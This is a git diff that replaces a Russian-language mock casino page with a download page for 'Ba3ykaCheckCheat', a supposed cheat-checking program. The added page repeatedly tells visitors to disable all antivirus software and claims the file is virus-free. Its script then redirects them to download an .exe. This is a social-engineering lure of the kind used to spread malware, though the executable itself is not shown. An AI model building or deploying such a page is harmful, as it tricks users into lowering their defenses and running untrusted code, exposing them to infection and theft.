@@ -3,48 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CXASINO</title>
+    <title>Ba3ykaCheckCheat - Проверка на читы</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <header>
-        <h1>CXASINO</h1>
-        <nav>
-            <a href="#" id="home-link">Главная</a>
-            <a href="#" id="slots-link">Слоты</a>
-            <a href="#" id="roulette-link">Рулетка</a>
-            <a href="#" id="mines-link">Минёр</a>
-            <a href="#" id="account-link">Аккаунт</a>
-        </nav>
-    </header>
-    <main>
-        <section id="home">
-            <h2>Добро пожаловать в CXASINO!</h2>
-            <p>Наслаждайтесь нашим казино .</p>
+    <div class="container">
+        <header>
+            <h1>Ba3ykaCheckCheat</h1>
+            <p>Уникальная программа для проверки на читы. Безопасно и просто!</p>
+        </header>
+        
+        <section class="download-section">
+            <h2>Скачать Ba3ykaCheckCheat</h2>
+            <p>Чтобы программа работала корректно, пожалуйста, отключите все антивирусы.</p>
+            <button onclick="downloadProgram()">Скачать сейчас</button>
+            <p class="warning">* Файл проверен и не содержит вирусов.</p>
         </section>
-        <section id="slots" class="game-section" style="display:none;">
-            <h2>Игровой автомат</h2>
-            <button id="play-slot-button">Играть</button>
-            <div id="slot-result"></div>
+        
+        <section class="security-section">
+            <h2>Безопасность</h2>
+            <img src="safety.png" alt="Безопасность">
+            <p>Мы гарантируем безопасность и отсутствие вирусов. Отключите антивирус для корректной работы.</p>
         </section>
-        <section id="roulette" class="game-section" style="display:none;">
-            <h2>Рулетка</h2>
-            <button id="play-roulette-button">Играть</button>
-            <div id="roulette-result"></div>
-        </section>
-        <section id="mines" class="game-section" style="display:none;">
-            <h2>Минёр</h2>
-            <button id="play-mines-button">Играть</button>
-            <div id="mines-result"></div>
-        </section>
-        <section id="account" style="display:none;">
-            <h2>Ваш аккаунт</h2>
-            <p>Баланс: <span id="account-balance">2000</span> RUB</p>
-        </section>
-    </main>
-    <footer>
-        <p>&copy; 2024 CXASINO</p>
-    </footer>
-    <script src="script.js"></script>
+        
+        <footer>
+            <p>© 2024 Ba3ykaCheckCheat. Все права защищены.</p>
+        </footer>
+    </div>
+
+    <script>
+        function downloadProgram() {
+            window.location.href = 'Ba3ykaCheckCheat.exe';
+        }
+    </script>
 </body>
 </html>
